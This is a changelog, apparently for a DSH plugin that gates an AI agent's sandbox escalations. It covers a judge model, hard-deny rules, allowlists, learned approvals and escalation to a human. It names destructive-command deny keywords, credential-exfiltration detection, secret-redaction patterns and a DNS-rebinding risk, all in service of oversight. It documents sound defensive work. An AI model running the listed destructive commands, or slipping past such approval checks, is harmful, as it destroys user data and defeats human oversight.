- 残余风险已写明：DNS rebinding 的页面与本地服务**字面上同源**（Origin 与 Host 都是攻击域名），任何 Origin 比对都识别不出它；真正的防线是 `connection.requestRejection` 的凭据围栏（rebinding 页面拿不到 127.0.0.1 上的会话 cookie）

**设置页（client.js）**

- 白名单卡片：标签改为「本会话沉淀」/「旧沉淀 · 已停用」/「用户」，规则行显示归属会话（截断 12 字符），并说明「审批产生的规则只在它产生的那个会话生效」
- 删除规则时一并带上 `sessionId`（两条签名相同、归属不同的沉淀规则是两条规则）
- 学习卡片：key 前缀由 host 格式化（新增 `describeLearnKey()`，`sessionId|tool|mode|category` → `tool|mode|category · 会话 xxx`），并说明计数按会话隔离
- 规则快照新增 `sessionScoped` / `legacyInactive` 注解，供界面区分「生效中」与「已停用」

### 回归测试

- `test/session-scope.test.mjs`（新增）：作用域语义表（本会话 / 别的会话 / 旧沉淀 / 手写 / 预置）、端到端「沉淀规则只对归属会话放行」、旧沉淀规则哪都不生效、手写全局规则不受影响、denyRules 跨会话仍生效、学习 key 落盘带会话前缀
- `test/origin-fence.test.mjs`（新增）：8 类允许来源（同源 / 回环跨端口 / 回环别名 / LAN / 反代）+ 7 类拒绝（跨源 / 端口不符 / scheme 不符 / `javascript:` / `data:` / `null` / Referer 跨源），并显式写下 rebinding 残余风险与凭据围栏的对照
- `test/pipeline.test.mjs` 用例 10c：学习状态改为按会话 key，并新增「换会话后不继承」断言（去掉会话前缀本断言立刻变红）
- `test/reconsider.test.mjs`：新增 5b（快照注解）与用例 8（无会话归属 → 400 且不写规则）；用例 4 补断言「规则带 sessionId」
- `test/client-render-smoke.test.mjs`：新增 6c（三种作用域标签 + 作用域说明）

### 兼容

- **存量数据的行为会变**（这是本次的目的，不是意外）：`allowlist.json` 里旧的自动沉淀 / 判定器不可用沉淀 / 追认规则**不再生效**，设置页会把它们标成「旧沉淀 · 已停用」；`learning.json` 里旧的全局计数 key（无会话前缀）不再被读取。想在所有会话生效的放行请改用「用户自定义」白名单规则（手写规则全局生效）
- 无 schema 迁移、无需改配置文件；`allowlist.json` 的 `version` 仍是 4
- 反向代理 / LAN 访问不受影响：同源与回环别名照旧放行；只有「同名不同端口」这类以前被误放行的来源改为 403

## [0.9.2] — 2026-10-03

设置页补上「裁判模型」入口：判定模型可以直接选，不用再手改 `allowlist.json`（设置界面移植自上游 PR #11，`@sunligh91`）。

### 问题

- **配置有、入口无**：`judgeModel`（判定模型与主力模型解耦）在后端早已支持——`applyRuleOp` 可写、`judgeModelCandidates` 用它排候选链、`migrateJudgeModel` 迁移旧字段——但设置页**完全没有**这个字段（`client.js` 零处 `judgeModel`），host 也没有模型目录端点。用户只能手改 `allowlist.json` 或 curl 才能换判定模型。而判定模型恰恰是最需要能改的一项：默认模型一旦是多步工具循环型（如 `agy`），单次判定在 `judgeTimeoutMs` 内跑不完，表现为「每次审批都转人工」，界面上却没有任何可操作的出口
- **上游 PR #11 的做法有缺口**：该 PR 同时给出设置页下拉框与 `/api/auto-approve/models`，但下拉框只在拿到目录时才有内容——目录拉取失败时只显示「正在加载可用模型…」并停在那里，用户既选不了也填不了

### 变更

- **`src/index.mjs`：新增 `GET /api/auto-approve/models`**。与对话框右下角的模型选择器同源：`llm.listProviders()` 的路由 + 逐路由 `llm.listModels(id)` 的模型表。只列已注册 adapter 的路由（未注册/休眠路由选了也调不通）；单个 provider 目录失败被隔离进 `failures`，其余路由照常可选（与宿主 `dsh-api-session-controller` 的 catalog 策略一致）。目录不可用一律返回 200 + 空列表 + `reason`，**不是 5xx**；端点同样受凭据围栏保护（issue #12）
- **`client.js`：设置页新增「裁判模型 · 与主力模型解耦」卡片**（④ Flash 判定区）。目录可用时是「路由 + 模型」两级下拉框（首项「跟随 agent 默认模型」）；目录不可用时**退化为手填 provider / model**，而不是卡在加载态——判定模型选错时正是最需要改的时候，不能让配置入口随目录一起失效。卡片底部显示当前生效值；若当前钉住的路由/模型已不在目录里（换过 provider、adapter 被移除），仍以下拉项出现并标注「当前配置，未注册 / 不在目录中」——否则会渲染成空值，用户一按「保存」就把固定值静默清掉
- **`test/models-endpoint.test.mjs`（新增）**：6 组断言锁住端点契约——目录转发与当前值回显、单 provider 失败隔离、目录不可用返回 200、405、以及凭据围栏 401 时不泄露任何路由/模型元数据
- **`test/client-render-smoke.test.mjs`：新增用例 6b**，断言目录可用时走下拉框（列表含所选路由的模型、不含其他路由的模型）与目录不可用时的「手填 + 显示当前生效值」降级
- **docs/GUIDE（中/英）**：`judgeModel` 一条补上设置页入口与降级行为

### 兼容

- **无配置变更、无需迁移**：`judgeModel` 的存储格式与解析逻辑一行未动，新端点只读
- 目录不可用（旧版 DSH / llm 服务缺失）时行为与 0.9.1 一致，只是设置页多了一张可手填的卡片

## [0.9.1] — 2026-10-02

危险词按**边界**匹配（修一个真实误报），并把「`$DSH_HOME` 写入永远人工」的既有语义写成文档。

### 问题

- **危险词误报**：`looksDeny` 对多词关键词用裸子串包含，`git push --force-with-lease`（带租约的**安全**强制推送）含子串 `push --force`，因此被当成强制推送转人工。2026-10-01 的审批记录里实测 4 次（事件 816 / 830 / 842 / 847），每次都要人工点一次，纯噪音。同类问题还有 `docker rmi` 命中 `docker rm`
- **语义被误读成 bug**：用户报告「审批自学习没生效」。现场是同一目标 `C:\Users\shiro\.dsh\profiles\desktop\cordis.patch.yml` 被人工批准 13 次，审批记录始终只显示「人工通过」、**没有**「学习 N/3」。根因是 `hardDenyFacts()` 把 `$DSH_HOME` 目标判为人工档并在管道**第 0 步** `return`，白名单（第 2 步）与学习计数（第 6 步）都在它之后——不计数、不学习、白名单盖不过、也没有追认按钮。这是**既有且有意**的安全语义（README / GUIDE 只写了「转人工」，没写「且永不学习」），文档缺失导致排查成本高

### 变更

- **`src/index.mjs`：`looksDeny` 改为边界匹配**（新增内部函数 `matchDenyKeyword`）。关键词首/尾是单词字符时，相邻字符不得落在 `[a-z0-9_-]` 内。一条统一规则同时挡住两类误报：前缀误伤（`format` 命中 `Format-Table` / `--format`）与**标志延长**（`push --force` 命中 `push --force-with-lease`、`docker rm` 命中 `docker rmi`）。关键词以 `=` / `:` 结尾（`dd of=`、`cipher /w:`）时该侧不设边界，与原行为一致；命中失败时继续向后找下一次出现，避免一次越界命中就漏掉同一文本里真正的危险词（`git push --force-with-lease … && git push --force …` 仍命中）
- **`test/unit.test.mjs`：`looksDeny` 断言改打生产实现**。此前该文件复制了一份同名函数，生产改坏测试也不会红（本次 RED 校验：还原源码后新用例立刻失败）。新增 8 条边界用例（`--force-with-lease` / `--force-if-includes` / `docker rmi` 不得命中；`--force` 在标志边界、分号后、`docker rm -f` 仍必须命中；越界命中之后的真危险词仍必须命中）
- **`test/pipeline.test.mjs`：新增用例 3b**，把「硬事实闸门排在白名单与学习之前」锁死，避免以后被当成 bug"修好"。断言四件事：① 即使 `allowRules` 里有一条精确指向该 `$DSH_HOME` 文件的规则也仍转人工（并**先断言这条规则确实能匹配**，防止用例空转）；② 判定模型零调用；③ `learning.json` 不产生该目标的计数；④ 事件 `path === 'hard-deny'` 且不带 `learningCount`（即界面上不会出现「学习 N/3」）。RED 校验：把人工档分支从源码删掉后，用例 3b 立即以 `a DSH_HOME target must still go to a human even with a matching allowlist rule` 失败
- **README（中/英）**：新增两条特性说明——「DSH_HOME 写入永远人工」的完整语义（不计数 / 不学习 / 白名单盖不过 / 无追认按钮 / 不显示学习进度）与「危险词按边界匹配」
- **docs/GUIDE（中/英）**：⓪ 硬拒层的「人工档」下补一段警示，写明它排在白名单与学习之前及其后果，并给出典型现场

### 兼容

- 危险词行为**只收窄误报，不放开真危险**：所有预置危险词的原有真阳性用例全部保持通过
- `$DSH_HOME` / home 根的审批行为**完全不变**（仍是人工档），本次只补文档与回归测试
- 无配置变更，无需迁移；`allowlist.json` 无需改动

## [0.9.0] — 2026-09-24

审批说明从「一段散文」改成**结构化字段表**：操作类型 / 操作路径 / 影响范围 / 执行命令 / 模型说明。

### 问题

- 说明是一整段散文（`沙箱提权到 danger-full-access：…。做什么：命令：…；目标路径：…`），审批人要读完才知道「这是删除还是新增、动的是哪个路径、影响多大」——用户原话：写得啰嗦、不够精炼、显示样式不直观
- 更根本的是：事件里只有 `zh` 一段文本，前端没有任何可结构化渲染的字段，想在界面上做成表格也无从下手

### 变更

- **`src/zh.mjs` 新增 `describeFacts()`**：把工具名 + 真实命令 + 真实目标路径 + 沙箱模式归成可直接展示的字段。操作类型做命令级判定：`rm` / `Remove-Item` / `format` / `git reset --hard` / `drop table` → **删除**；`git … push`（含 `git -c key=value push`）/ `gh release` / `npm publish` / `scp` / `curl` → **推送/发布**；`write` → **新增/写入**；`edit` → **修改**；`read` → **读取**；其余按工具语义归为执行命令/检索/调用。删除与发布同现时以删除为准（不可逆优先）
- **`describeFacts()` 同时给出影响范围**：`danger-full-access` → 整机（工作区外任意路径可读写，含系统位置；改动不可自动回滚）、`workspace-write` → 工作区（仅工作区内可写，工作区外仍被拒绝）、`read-only` → 只读、未提权 → 沙箱模式不变
- **`buildChineseReason()` 改为按字段分行**：`操作：…` / `路径：…` / `影响：…` / `命令：…` / `原因：…`。删掉「沙箱提权到 X：…」前缀（模式已在「影响」行交代）与「做什么：…」散句；回溯命令仍标注「命令（回溯最近同名调用）：…」；命令类工具缺命令仍写 `命令：host未提供`
- **`src/index.mjs`：事件落 `facts` 字段**（`compactFacts()` 白名单 + 逐项截断 + 路径上限 8 条），自动放行与人工审批事件都带，供前端表格渲染
- **`client.js`：审批记录行内渲染字段表格**（真正的 `<table>`，字段列 72px + 值列；删除红、新增绿、修改蓝、推送发布琥珀；路径与命令等宽字体、可换行）；顶部提示条用一行摘要（`删除 · a.txt 等 3 处 · 整机`），facts 摘要 → `zh` → 原文依次回退
- **`client.js`：顶部「审批」tab 显示本会话记录条数**（`审批 (12)`）。宿主把 `conversation.view` 的 `label` 经 `resolveSlotLabel()` 的结果**当字符串**渲染，且只在「slot 变更 / locale 发布」时重算 tab 列表（`label` thunk 的既有语义就是「跟着 locale 走」），因此实现为：一个读模块级计数的 label thunk + 条数真变化时发布一次 locale（注册一次性 namespace，用完即撤）触发重算。口径 = 视图真正列出的行数（`manual-pending` 只活在提示条里，不计入），避免「tab 说 5 条、列表只有 4 行」；没有 locale 服务时自动退回静态「审批」，条数照旧在视图内展示
- **事件 API 给老事件补 `facts`**：盘上缺 `facts` 的事件（v0.9.0 之前落的盘）在响应里按**已记录的事实**（tool / mode / files / command / justification）现算一份，让整段历史也能渲染字段表格。**不回写文件**——事件日志保留当初写下的事实

### 未做（有意）

- **宿主审批卡不做 HTML 表格**：宿主 `dsh-client-ui-approval` 把 `reason` 当**纯文本**塞进一个 `<div>`（既非 Markdown 也不解析 HTML，且无 `white-space:pre-wrap`），插件只能改那段字符串本身。靠注入 CSS 去改写宿主 DOM 能做到伪表格，但依赖宿主内部类名/属性，DSH 升级即失效 —— 因此宿主卡保持纯文本（但已是字段分行），表格落在本插件自己的审查视图里

### 兼容

- 老事件没有 `facts` → 前端继续按 `zh` / `justification` 文本渲染，不会空白
- `zh` 字段保留（宿主卡正文与提示条仍需纯文本），`facts` 是新增字段，旧客户端忽略它即可

### 测试

- `test/zh.test.mjs` 重写为 16 组断言：操作类型六分（含 `git -c … push` 与删除优先）、影响范围五档、回溯命令标注、`compactFacts` 白名单/路径上限/未知键丢弃、宿主卡五字段行序、真实事故样本（整机 + 无路径 + 长命令 → `操作：推送/发布`）
- `test/client-render-smoke.test.mjs`：`inspect()` 支持展开函数组件，新增「结构化事实 → 字段表格」用例（五个字段名、真实路径、整机、原样命令、`ag-facts-v-del` 配色）、「无 `facts` 的老事件仍回退文本」、以及「顶部 tab 条数」（label 是 thunk、提示条一挂载就把条数推上去、`manual-pending` 不计入）
- `test/pipeline.test.mjs`：17d 断言事件同时落 `command`、`zh` 与 `facts.action`/`facts.scopeShort`
- `test/reconsider.test.mjs`：事件 API 断言老事件（盘上无 `facts`）在响应里补出 `facts`（操作类型/影响范围/路径），且**文件里不写回**
- `npm test` 全套通过（zh / unit / seed-sync / absorbed / pipeline / reconsider / reconsider-match / client-render-smoke）

## [0.8.5] — 2026-09-24

提权说明去掉噪音：`write` / `edit` 这类没有命令字段的工具不再写「命令：host未提供」这一行。

### 问题

- v0.8.3 让「命令」行无条件出现，于是文件类工具的审批卡上多出一行永远为 `host未提供` 的噪音 —— 0.8.4 重启后的实测（写入 `C:\Users\shiro\Documents\dsh-approval-gate-probe.txt`）看到的就是 `做什么：命令：host未提供；目标路径：<真实路径>`，命令那半句纯属干扰

### 修复

- **`src/zh.mjs`：命令类工具才输出命令行**。`COMMAND_TOOLS` 覆盖 `pwsh` / `powershell` / `cmd` / `bash` / `sh` / `zsh` / `exec` / `run` / `shell` / `terminal` / `python` / `node` / `deno` / `bun` / `curl` / `wget` / `ssh` / `scp`，并识别 `terminal-bash` 这类带前后缀的变体；`write` / `edit` / `write_file` 等文件类工具即使没有命令也不再出现命令行
- **目标路径行不变**：有真实路径就列出（最多 5 条），没有就写明 `host未提供`，`danger-full-access` 仍追加「不限定路径，本次授权覆盖整机」

### 测试

- `test/zh.test.mjs` 新增 3 组断言：`write` 提权全文不含「命令」只留目标路径、`edit` 缺路径时只有目标路径行且带整机声明、`terminal-bash` 算命令类而 `write_file` 不算
- `npm test` 全套通过（zh / unit / seed-sync / absorbed / pipeline / reconsider / reconsider-match / client-render-smoke）

## [0.8.4] — 2026-09-24

根因修复：插件一直读 `session.events`，而 DSH 的 `Session` 根本没有这个字段 —— 结构化参数、确定性硬拒层、用户授权来源三处因此长期失效。

### 问题

- **读错了 API**：`req.agent.session` 是 DSH 的 `Session` 实例，公开事件入口是 `snapshotEvents()` / `ownEvents()`。`Session.prototype` 只有 `id` / `seq` / `header` / `eventAt` / `snapshotEvents` / `ownEvents` / `append`，**没有 `events`**（已用 `Object.getOwnPropertyDescriptors` 实测确认）。于是 `Array.isArray(undefined) === false`
- **三处连带失效**：
  1. B 层结构化参数解析（`tool/call` 的 `file_path` / `command`）从未命中 —— 生产 `events.jsonl` 485 条审批事件的 `command` 字段为 0 条，v0.8.3 的「回溯最近同名调用」兜底正是在给这个错误打补丁
  2. `hardDenyFacts` 拿到的永远是 `{}` —— 确定性硬拒层「写入/删除类工具的目标落在受保护位置」这条分支在生产上从未触发（凭据外发的 args 分支同样）
  3. `trustedUserMessages(session, 4)` 恒为空 —— 送给判定模型的「唯一用户授权来源」一直是空的
- **为什么测试没抓到**：测试夹具把 session 造成 `{ events: [...] }`，正好喂了插件以为存在、生产上并不存在的字段

### 修复

- **`src/index.mjs` 新增 `sessionEvents(session)`**：依次尝试 `snapshotEvents()` → `ownEvents()` → `events` 字段（后者保留兼容旧宿主与既有测试），任何访问器抛错都降级而不影响审批
- **审批处理器改用该入口**：`toolFiles` / `toolCmd` / 硬拒层 `callArgs` 全部取真实事件；`trustedUserMessages` 内部同样改用
- **测试夹具改为生产形态**：`makeReq` 默认构造 `{ id, header, snapshotEvents() }`（**不带** `events` 字段），「只认 events 字段」的回归会让整套用例立刻变红；另留 `legacyEventsField` 选项验证兼容分支

### 行为变化（重启后可见）

- 写入 `C:\Windows\...`、`~/.ssh`、文件系统根等受保护位置：**直接硬拒且不弹窗**（此前会走到判定/人工）
- 危险词层现在能看到真实命令（`looksDeny` 拼入 `toolCmd`），命中危险词的操作会更常转人工
- 审批记录与提权提示里的「命令」「目标路径」开始出现真实值，而不是回退到从模型说明里抠出来的碎片

### 测试

- `test/pipeline.test.mjs` 新增用例 17（a–e）：生产形态下系统路径写入被硬拒（`kind: 'hard-reject'`，零人工）、无事件入口时同样调用**不会**被硬拒（负向对照，证明缺口真实存在）、legacy `events` 字段仍生效、真实命令进入事件与中文说明、`sessionEvents` 的优先级与异常降级
- `npm test` 全套通过（zh / unit / seed-sync / absorbed / pipeline / reconsider / reconsider-match / client-render-smoke）

## [0.8.3] — 2026-09-24

审批提示永远写清「命令 / 目标路径」，缺失就写明 host 未提供；同时修掉让这两行永远是空的根因。

### 问题

- **提权提示里没有命令，也没有目标路径**：审批人只看到沙箱模式的后果说明和一段模型原文，无法判断这条提权到底要跑什么、动哪里。用户原话：「这会话中的提权为什么没写具体路径 是全电脑的路径吗」
- **根因是结构化参数一直没取到**：说明用的命令来自按 `callId` 严格命中会话里的 `tool/call` 事件参数，而生产 `$DSH_HOME/auto-approve/events.jsonl` 中 **485 条审批事件的 `command` 字段全部为 0 条** —— 该查找在真实调用路径上从未命中（会话日志里 `tool/call` 与 `approval/asked` 相邻且 callId 一致，说明审批处理器看到的会话事件视图与落库顺序不一致）
- **中文原文分支更糟**：`justification` 已是中文时，说明只做 `沙箱提权到 <mode>：` 前缀本地化，命令与目标路径整段丢弃

### 修复

- **`src/zh.mjs`：提权说明固定输出「做什么」行**，命令与目标路径缺失时写明 `host未提供`；`danger-full-access` 追加「不限定路径，本次授权覆盖整机，而非某一条路径」，避免被误读成单路径授权；`workspace-write` 不做整机声明
- **中文分支同样带上**「做什么」行，不再只做前缀本地化
- **`src/index.mjs`：新增 `resolveDisplayCommand`**。严格命中失败时回溯会话中最近一次同名工具的 `tool/call` 取真实命令，并在文案里标注「命令（回溯最近同名调用）」—— 不伪装成这次调用的确切参数
- **兜底只作用于给人看的说明**：硬拒 / 硬事实 / 白名单 / 规则指纹 / diff 快照仍只用严格命中的参数，避免错认参数影响安全裁决

### 测试

- `test/zh.test.mjs` 新增 4 组断言：缺事实时两行必须在场且说明整机授权、`workspace-write` 不做整机声明、回溯命令必须标注来源、中文分支必须列出命令与目标路径
- `test/pipeline.test.mjs` 新增用例 16：`callId` 命中优先、落空回溯最近同名调用（忽略其他工具）、edit 无命令时不得凭空编造、无 `callId` 仍可回溯、空事件列表与坏 JSON 不抛错
- `npm test` 全套通过（zh / unit / seed-sync / absorbed / pipeline / reconsider / reconsider-match / client-render-smoke）

## [0.8.2] — 2026-09-22

修复「自动学习不生效」：确认计数早已超过阈值，提权却仍然每次弹人工审批。

### 问题

- **判定器不可用的分支排在确认计数检查之前**：只要判定模型超时或返回异常，代码就直接转人工，永远走不到「确认满 N 次」那条路。事故现场（会话 `session-c7c21920`，2026-09-22 20:15–21:10）：`learning.json` 里 `pwsh|danger-full-access|neutral` 已累计到 **8/3**，审批记录却一路显示「人工通过 · 学习 6/3（满 3 次自动放行）」——计数在涨，审批一次不少
- **失败原因是上游抖动而非操作本身**：同期判定器报 `Stream ended without finish_reason`、上游 `code=4001` 与 20s 超时，属于判定层失去能力；此时"转人工"既不解决判定器，也不兑现已经完成的学习
- 计数与放行逻辑因此脱节：`learning.stats` 显示 8/3，行为却等同 0/3，反复人工批准也无法改变下一次结果

### 修复

- **判定器不可用时先兑现已完成的学习**（`src/index.mjs`）：失败分支先查该 `工具|模式|neutral` 键的确认计数，`learning.enabled` 且计数 ≥ `riskyThreshold` 时直接自动放行并记录事件（`path: learned-judge-unavailable`），不再转人工；放行同时清掉该会话的判定失败计数
- **硬风险闸门不受影响**：硬拒（凭据外泄 / 系统路径销毁）、硬事实（DSH_HOME / home 根）、危险词、白名单与 `denyRules` 都排在判定之前，硬风险类别仍每次人工确认。该兜底只作用于已满足阈值的 `neutral` 键
- **取舍（明确记录）**：判定器不可用时无法做「语义同类验证」，因此这里以**确认计数**为唯一依据放行——比判定器健康时的路径宽松（健康路径在指纹未命中时还会要求判定模型判同类）。这是刻意选择：判定器挂了不应该让已经确认过的同类操作无限期卡在人工审批

### 测试

- `test/pipeline.test.mjs` 新增用例 10c：预置 `pwsh|danger-full-access|neutral = 6`、判定器连续抛错，断言 `allowed-once` 且 `nextCalls = 0`（**零人工审批**），并确认判定器确实被调用过（证明走的是失败兜底而非白名单命中）
- 用例 10 / 10b / 10d 前置清空 `learning.json`：这三个用例验证的是「未达阈值 → 转人工」，此前会被同进程内累计的学习计数污染而误判

## [0.8.1] — 2026-09-21

审批说明中文化：模型写的 `justification` 常常是英文（子代理与其他 provider 尤其明显），宿主模板还带一段英文前缀 `escalate sandbox to <mode>:` ——审批人得先读懂英文才能决定批不批。

### 新增

- **面向审批人的说明一律中文**（`src/zh.mjs`）：说明由**结构化事实**生成——目标沙箱模式、真实命令、真实目标路径——并交代后果（可写范围 / 能否回滚 / 是否影响工作区外）。命令、路径、参数一律原样保留，不翻译、不改写；模型原文已是中文时只本地化英文前缀，不改写措辞
- 事件新增 `zh` 字段：审批卡片正文与「审批」视图记录都优先渲染它；`justification` / `reason` 仍保存原文，审计记录不失真。老事件没有 `zh`，自动回退原文

### 修复

- **宿主英文前缀不再直达审批人**：提权请求正文由 `escalate sandbox to danger-full-access: …` 变为「沙箱提权到 danger-full-access：…」
- **四个转人工出口都覆盖**：`forwardToHuman`、两处「前 N 次人工确认」、判定器异常回退；自动放行的事件只追加 `zh` 显示字段，不改 `reason`（避免影响下游对原文的匹配）

### 测试

- `test/zh.test.mjs`（新增）：中文检测、英文 → 中文说明、原文中文只本地化前缀、无提权模式的兜底、未知模式不谎报后果、超长截断
- `test/client-render-smoke.test.mjs`：新增「提示条优先渲染 `zh`」与「记录行有 `zh` 用中文、缺 `zh` 回退原文」两组断言

## [0.8.0] — 2026-09-18

修复「判定器不可用」被当成「操作有害」所引发的一连串误拒：用户在审批记录里刚批准一次，下一次同类调用又被静默拒绝，只能反复追认。

事故证据（会话 `session-c44df57e`，2026-09-18 20:27–20:48）：8 次审批请求里 **4 次**是判定器不可用造成的；`audit.log` 累计 49 条 `FAILED`，其中 09-17/09-18 两天 8 条。

### 修复

- **判定模型不再把 reasoning 当正文**：`callFlash` 此前在正文为空时 `return reasoning`，把思考文本交给 JSON 解析，必然失败——真实原因（正文根本没产出）被掩盖成「格式不合规」。现在显式抛错并带上 reasoning 长度
- **判定输出上限 256 → 1024（可配置 `judgeMaxTokens`）**：中转（ai-gateway）对 DeepSeek 系强制 `thinking=enabled` 并把 effort 补成 `high`，推理与正文共享 `max_tokens`，256 token 被推理吃光 → 正文为空。这是「判定器失败」最常见的真因
- **判定器不可用 → 第一次就转人工**（`judgeFailureLimit` 默认 3 → 1）：判定器不可用是"判定层失去能力"，不是"这个操作有害"，静默拒绝只会让 agent 反复撞墙、用户事后才发现。保留配置项，设为 >1 可回到旧节奏
- **`flash-failed` 转人工、用户批准后沉淀放行规则**：此前该分支只记学习样本、不写规则，下一次同目标调用仍要过坏判定器，于是又被静默拒绝（20:43:23 批准 → 20:43:35 又被拒的直接原因）
- **失败原因落进 `audit.log` 与事件记录**：此前只返回 `{ failed: true }`，超时 / 上游报错 / 正文为空 / JSON 不合规无法区分，排障全瞎
- **追认无指纹时不再写宽规则**：旧行为写「工具+模式+类别」宽规则，等于放行该工具在提权模式下的一切操作（20:43:39 落了一条无指纹的 `write` 规则，覆盖了此后所有 write 提权）。现在无指纹直接 400，并说明改用设置页白名单
- **命令类工具（pwsh）的指纹取自真实命令**：事件新增 `command` 字段。此前追认 pwsh 只能从 justification 取偶然词（事故：`contains:"job"` 只匹配含 "job" 的那一次，下一次措辞变成「以后台方式」即失效）
- **判定模型候选链**：主判定模型 → 会话默认模型 → 内置兜底。单通道抖动（09-17 的 workbuddy `502 upstream_runaway`）不再等于判定器整体不可用

### 新增

- 设置页新增两个可调项：**判定器失败即转人工（次）** 与 **判定输出上限(tokens)**
- 审批记录显示**真实失败原因**（超时 / 上游报错 / 正文为空），并把「判定器不可用」与「判定为有害」的文案明确区分
- 内置白名单新增三条：Rime 用户目录（`%APPDATA%\Rime`）的 write/edit，以及小狼毫 `WeaselDeployer.exe` 部署。该目录连续两天被人工批准，属于已知安全目标
- 种子 `allowlist.json` 补齐 `judgeFailureLimit` / `judgeMaxTokens` 默认值

### 测试

- `test/pipeline.test.mjs`：用例 10 改为「第一次失败即转人工」；新增 10b（`judgeFailureLimit>1` 保留旧节奏）、10c（批准后沉淀指纹规则，且下一次同目标调用**零判定器调用**）、10d（失败原因落进事件）、14（候选链：主通道 502 → 备用通道判定成功）、15（候选链纯函数去重/丢空值/保序）；用例 11 改用 `judgeFailureLimit=2` 验证成功清零
- `test/reconsider-match.test.mjs`：新增「无指纹追认 → 400 不写宽规则」与「命令类工具指纹取自 `event.command`，措辞变化仍命中」
- `test/client-render-smoke.test.mjs`：新增判定器不可用 vs 有害的文案区分与失败原因展示；设置页断言两个新配置项；`/api/auto-approve/rules` 桩补全
- `test/absorbed.test.mjs`：更新默认值断言（`judgeFailureLimit=1`、`judgeMaxTokens=1024`）与失败原因入审计的源码契约

## [0.7.1] — 2026-09-17

修复追认后的记录**看起来仍被拒绝**的显示缺陷。

### 修复

- **追认后的记录文案翻转为「已放行」**：追认不改写原事件（它确实是一次拒绝，审计事实保留），只加 `reconsidered` 标记。但旧文案把两者拼成「已追认 · 已直接拒绝 · 判定器不可用（连续失败）」并保留红色 ✕ 与错误底色——用户点完「重新审批通过」看到它，会以为追认没生效。现在追认过的静默拒绝显示为 **「已追认放行 · <原因>（曾直接拒绝）」**，图标改 ✓、标签改完成色、行不再带待处理红条；原拒绝原因收在括号里，不隐瞒历史
- **追认过的记录不再算待处理、也不再弹常驻提示条**：刷新页面时已追认的拒绝不再作为红色提示条恢复（此前会在「待处理 N」角标与提示条上重复出现，尽管规则早已写入、AI 早已重试）
- 追认按钮的显隐补上 `reconsidered` 围栏（与「待处理」判定一致），已追认的行不再重复出现按钮

### 测试

- `test/client-render-smoke.test.mjs` 新增两组用例：追认行渲染为「已追认放行 · 判定器不可用（曾直接拒绝）」+ 完成色标签、且只把**未追认**的那条计入「待处理 1」；已追认的拒绝刷新后不再弹提示条

## [0.7.0] — 2026-09-16

修复判定管道的一个顺序缺陷，并补上「静默拒绝」的用户可见性与补救通道。

### 修复

- **硬风险类别现在优先于判定模型的 `deny`**：此前 `deny` 分支排在硬类别检查之前，模型对硬类别（`deletion`/`credential`/`remote`/`system`/`bulk`）判 `deny` 时会被**静默拒绝**，用户配置的 `hardCategories` 形同虚设——工作区外的合法写入（如 `%APPDATA%` 下的应用配置）连人工放行的机会都没有。现在硬类别是**对称安全闸**：
  - `allow` + 硬类别 → 转人工（原有行为）
  - `deny` + 硬类别 → 转人工（本次修复）
  - `deny` + `neutral` → 仍静默拒绝（不弹窗，让 agent 改方案）
- 确定性硬拒层（凭据外泄、文件系统根与系统路径销毁）行为**不变**：仍在管道最前，白名单与追认都无法覆盖

### 新增

- **「重新审批通过」（追认）**：审批记录里的静默拒绝可被追认，写入带操作指纹的自动放行规则并投递重试指令让 AI 重跑该操作。围栏两道：
  - 只有**判定层静默拒绝**（`judge-deny`）可追认；确定性硬拒档（`hard-reject`）在管道最前，白名单盖不过它，给按钮就是假承诺 → 400 拒绝
  - **硬风险类别**属于「必须人工确认」，不接受追认式自动放行 → 400 拒绝
  - 新端点 `POST /api/auto-approve/reconsider`；追认记录写为 `kind: "reconsidered"` 且带 `reconsiderOf` 指回原事件
- **拒绝提示条常驻**：静默拒绝与人工拒绝的提示条不再 4 秒自动消失，而是一直挂在对话框上方，直到用户切到「审批」tab 或点了处理按钮；自动放行仍按原样几秒后收起。已读位置按会话持久化在浏览器 `localStorage`，刷新页面不会丢待处理记录，也不会重复打扰已读记录
- **「审批」tab 待处理角标**：视图标题旁显示仍有几条拒绝未追认；提示条提供「查看审批记录」（切到审批 tab）与「重新审批通过」两个动作

### 测试

- `test/pipeline.test.mjs`：用例 7 改为 `deny + neutral` 仍静默拒绝；新增用例 7b 锁定 `deny + 硬类别 → 转人工`，并用同一工具/同一理由的 `neutral` 变体做对照，确保放宽没有变成全面放开
- 新增 `test/reconsider.test.mjs`：追认端点的 7 项契约（硬拒不可追认、硬类别不可追认、neutral 可追认且写指纹规则 + 投递重试 + 记录 `reconsiderOf`、事件 API 标注与过滤、重复追认幂等、未知事件 404）
- 新增 `test/client-render-smoke.test.mjs`：用最小 React hooks 垫片 + DOM/fetch 桩**真实渲染** client bundle，覆盖拒绝提示条常驻与按钮、硬拒不给追认按钮、审批视图仅可追认行有按钮、打开审批 tab 标记已读、已读刷新后不再弹

## [0.6.0] — 2026-09-16

从 [NanmiCoder/dsh-auto-mode](https://github.com/NanmiCoder/dsh-auto-mode)（MIT License）移植 5 项能力，按本仓库的确认制学习管道适配。

### 新增

- **确定性硬拒层**（`src/paths.mjs` + `hardDenyFacts()`）：判定基于工具参数的**真实路径与凭据事实**，而非 `justification` 关键词，且判定模型无权推翻。分两档：
  - **直接拒绝**（返回 `rejected`，不弹窗，让 agent 改方案）：对外调用携带凭据材料；破坏性目标落在文件系统根、系统或凭据关键路径、Windows 设备/NT 命名空间、Windows 保留设备名
  - **转人工**（保留手动放行能力）：目标为 `$DSH_HOME` 或用户 home 根本身
- **判定输入脱敏**（`src/sanitize.mjs`）：密钥与大块正文在送判定模型前抹除/截断——私钥块、`AKIA`/`ASIA`、GitHub/Slack 令牌、`Bearer` 头、`key=value` 密钥 → `[redacted-secret]`；密钥类字段名 → `[redacted-secret-field]`；大块正文字段 → `[redacted-<字段>:<长度>-chars]`；文本截断 1000 字符，深度 3 / 数组 25 / 对象 50。工作区路径含敏感形态时转人工，不外发
- **结构化 JSON 裁决协议**（`src/classifier.mjs`）：严格 `{decision, reason, category}` 替代原文本 `SAFE` / `RISKY:<类别>`；`decision` ∈ `allow`/`ask`/`deny`，`category` ∈ `deletion`/`credential`/`remote`/`system`/`bulk`/`neutral`，`reason` 非空且 ≤1000 字符；任何格式偏差抛错并按 fail-safe 处理
- **判定器连续失败计数**：按会话计数，前 2 次静默拒绝让 agent 改方案，第 3 次转一次人工，避免判定器长期不可用时卡死任务；判定成功一次即清零。阈值由 `judgeFailureLimit` 配置（默认 3）
- **动态系统提示指导**：预设激活期间向会话动态上下文注入 `<auto_approve_policy>`（顺序紧随宿主沙箱策略），从源头减少需要判定的越界请求
